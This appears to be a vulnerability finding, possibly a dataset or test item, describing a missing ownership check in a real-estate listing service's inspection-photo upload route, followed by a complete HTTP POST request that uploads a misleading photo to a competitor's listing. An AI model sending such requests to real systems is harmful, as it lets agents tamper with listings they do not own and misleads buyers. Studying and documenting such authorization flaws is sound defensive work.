diagnosis: The route handler uploads inspection photos to PropertyListing matching propertyId. While the user is authenticated as an agent, the handler does not check if property.assignedAgentId === req.user.agentId. Any real estate agent can inject misleading inspection photos into competitor property listings.
exploit_request:
POST /properties/65fa01928b12e001920042a1/inspection-photos HTTP/1.1
Host: listings.mlsportal.com
Authorization: Bearer <agent_token>
Content-Type: multipart/form-data; boundary=----MLSPhotoBoundary

------MLSPhotoBoundary
Content-Disposition: form-data; name="photos"; filename="damage_leak.jpg"
Content-Type: image/jpeg

<image_data>
------MLSPhotoBoundary--
